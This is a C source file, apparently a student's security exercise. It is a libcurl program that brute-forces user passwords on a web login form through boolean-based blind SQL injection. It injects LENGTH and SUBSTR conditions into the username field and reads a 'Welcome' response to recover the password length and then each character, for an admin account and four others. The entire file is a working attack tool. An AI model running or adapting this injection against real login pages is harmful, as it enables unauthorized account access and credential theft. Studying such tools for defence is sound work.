/************************************************************************************************
*
* Author       : Caille Jimmy, ICT student in Telecomunication Networks and Information Security
* Prerequisite : install libcurl-dev
* Compile      : gcc attack.c -o attack -lcurl -Wall -Wextra
* Usage        : ./attack
* License      : Unlicense, for more information, please refer to <https://unlicense.org>
*
* Version      : v0.2 - attacking multiple usernames
*
*************************************************************************************************/


#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h> //boolean
#include <string.h>
#include <unistd.h> //usleep
#include <sys/time.h>
#include "curl/curl.h"

#include "attack.h"

#define START_CHAR 32
#define END_CHAR   126
#define MIN_LEN    1
#define MAX_LEN    20
#define USR_INPUT_NAME "user"
#define PWD_INPUT_NAME "password"
#define PWD_DB_NAME    "password"
#define USERNAME_1 "admin"
#define USERNAME_2 "user2"
#define USERNAME_3 "user3"
#define USERNAME_4 "user4"
#define USERNAME_5 "user5"
#define USERS_NB   5
#define SUCCESS_TXT "Welcome"
#define URL "http://"
#define VERBOSE 0

//global vars
CURL *curl;
CURLcode res;
struct string s;

//main program
int main(void){
  char* users[5];
  users[0] = USERNAME_1;
  users[1] = USERNAME_2;
  users[2] = USERNAME_3;
  users[3] = USERNAME_4;
  users[4] = USERNAME_5;
  
  for(int u=0;u<USERS_NB;u++){
    //shows attack parameters
    printParams(users[u]);
    //used to compute running time
    time_t t_begin = time(NULL);
    int    t_span=0;
    //used to recover password length
    int pwd_len=0;
    //used to store password
    char* cracked;

    printf("Checking length... ");
    fflush(stdout);
    for(int i=MIN_LEN;i<=MAX_LEN;i++){
      //erase if char not found
      if(i>9){
        printf("\b\b");
      }else if(i>MIN_LEN){
        printf("\b");
      }
      
      //print current length checked
      printf("%d",i);
      fflush(stdout);
      
      //wait a bit
      usleep(200000);//200ms

      //copy current length in char for parameters building
      /*
      char number[3];
      sprintf(number,"%d",i);
      */

      //parameters building
      char fields[100];
      
      sprintf(fields,"%s=%s' AND LENGTH(%s)=%d;&%s=dummy",USR_INPUT_NAME,users[u],PWD_DB_NAME,i,PWD_INPUT_NAME);
      
      /*
      strcpy(fields,USR_INPUT_NAME);
      strcat(fields,"=");
      strcat(fields,users[u]);
      strcat(fields,"' AND LENGTH(");
      strcat(fields,PWD_DB_NAME);
      strcat(fields,")=");
      strcat(fields,number);
      strcat(fields,";");
      strcat(fields,"&");
      strcat(fields,PWD_INPUT_NAME);
      strcat(fields,"=dummy");
      */

      if(VERBOSE) printf("%s\n",fields);
      
      //do request
      if(doRequest(fields)){
        printf(" FOUND!\n");
        pwd_len=i;
        break;
      }
    }
    //test if password length was found
    if(pwd_len==0){
      fprintf(stderr, "\nPassword length not found... (try to set MAX_LEN higher perhaps ?)\n");
      continue;
    }
    
    //reserve space for password if size found
    cracked = calloc(pwd_len,sizeof(char));
    if(cracked == NULL){
      fprintf(stderr, "malloc() failed\n");
      cleanup();
      exit(EXIT_FAILURE);
    }
    
    //for each char
    for(int j=MIN_LEN;j<=pwd_len;j++){
      //print current letter's number
      printf("Brute-forcing %d",j);
      if(j==1 || j==11){
        printf("st letter... ");
      }else if(j==2 || j==12){
        printf("nd letter... ");
      }else if(j==3 || j==13){
        printf("rd letter... ");
      }else{
        printf("th letter... ");
      }
      fflush(stdout);
      //check each char
      bool found=false;
      for(int i=START_CHAR;i<=END_CHAR;i++){
        //erase if char not found
        if(i>START_CHAR) printf("\b");
        //print current char
        printf("%c",i);
        fflush(stdout);
        //convert number to char for parameter
        /*
        char number[3];
        sprintf(number,"%d",j);
        */
        //get corresponding char
        char ch[2];
        sprintf(ch, "%c", i);

        //parameters building
        char fields[100];
        
        sprintf(fields,"%s=%s' AND SUBSTR(%s,%d,1)='%s';&%s=dummy",USR_INPUT_NAME,users[u],PWD_DB_NAME,j,ch,PWD_INPUT_NAME);
        
        /*
        strcpy(fields,USR_INPUT_NAME);
        strcat(fields,"=");
        strcat(fields,users[u]);
        strcat(fields,"' AND SUBSTR(");
        strcat(fields,PWD_DB_NAME);
        strcat(fields,",");
        strcat(fields,number);
        strcat(fields,",1)='");
        strcat(fields,ch);
        strcat(fields,"';");
        strcat(fields,"&");
        strcat(fields,PWD_INPUT_NAME);
        strcat(fields,"=dummy");
        */

        if(VERBOSE) printf("%s\n",fields);

        if(doRequest(fields)){
          found = true;
          printf(" FOUND!\n");
          //add char to password
          if(j==START_CHAR){
            strcpy(cracked,ch);
          }else{
            strcat(cracked,ch);
          }
          break;
        }
      }
      //test if char was found
      if(!found){
        fprintf(stderr, "\nChar not found... (try to set END_CHAR higher perhaps ?)\n");
        cleanup();
        exit(EXIT_FAILURE);
      }
    }
    //compute time
    t_span = (double)(time(NULL) - t_begin);
    printf("Password %s found in around %d seconds !\n\n", cracked, t_span);
  
  }
  //clean
  cleanup();
  
  return EXIT_SUCCESS;
}
//cleans library and malloc
void cleanup(){
  if(s.ptr){
    free(s.ptr);
    s.ptr = NULL;
  }
  if(curl) curl_easy_cleanup(curl);
  curl_global_cleanup();
}

//print parameters
void printParams(char* usr){
  printf("URL to attack  : %s\n",URL);
  printf("Parameters are : %s=%s&%s\n",USR_INPUT_NAME,usr,PWD_INPUT_NAME);
  printf("Pwd len min: %d max:%d, and chars are :\n",MIN_LEN,MAX_LEN);
  for(int i=START_CHAR;i<=END_CHAR;i++){
    printf("%c",i);
  }
  printf("\n");
}

//init string for response handling
void init_string(struct string *s) {
  s->len = 0;
  s->ptr = malloc(s->len+1);
  if(s->ptr == NULL){
    fprintf(stderr, "malloc() failed\n");
    cleanup();
    exit(EXIT_FAILURE);
  }
  s->ptr[0] = '\0';
}

//write response in given string
size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s){
  size_t new_len = s->len + size*nmemb;
  s->ptr = realloc(s->ptr, new_len+1);
  if (s->ptr == NULL) {
    fprintf(stderr, "realloc() failed\n");
    cleanup();
    exit(EXIT_FAILURE);
  }
  memcpy(s->ptr+s->len, ptr, size*nmemb);
  s->ptr[new_len] = '\0';
  s->len = new_len;

  return size*nmemb;
}

/*do request (connect) with given parameters
 *returns: 1 success, 0 failed
 */
int doRequest(char* params){
  if(curl == NULL){
    /* In windows, this will init the winsock stuff */
    curl_global_init(CURL_GLOBAL_ALL);
    /* get a curl handle */
    curl = curl_easy_init();
  }
  if(curl){
    init_string(&s);
    //debug
    //curl_easy_setopt(curl, CURLOPT_VERBOSE, 1);
    //set function to handle response
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
    //set string to save response
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
    //set request url
    curl_easy_setopt(curl, CURLOPT_URL, URL);
    //set request data
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, params);
    //set content type
    struct curl_slist *hs=NULL;
    hs = curl_slist_append(hs, "Content-Type: application/x-www-form-urlencoded");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hs);
    //set request type
    curl_easy_setopt(curl, CURLOPT_POST, 1);
    //perform request
    res = curl_easy_perform(curl);
    //check for errors
    if(res != CURLE_OK){
      fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
      cleanup();
      exit(EXIT_FAILURE);
    }
    if(VERBOSE) printf("%s\n", s.ptr);
    //verify response
    if(strstr(s.ptr, SUCCESS_TXT) != NULL){
      if(s.ptr){
        free(s.ptr);
        s.ptr = NULL;
      }
      return 1;
    }else{
      if(s.ptr){
        free(s.ptr);
        s.ptr = NULL;
      }
      return 0;
    }
  }else{
    fprintf(stderr, "curl_global_init() failed\n");
    cleanup();
    exit(EXIT_FAILURE);
  }
}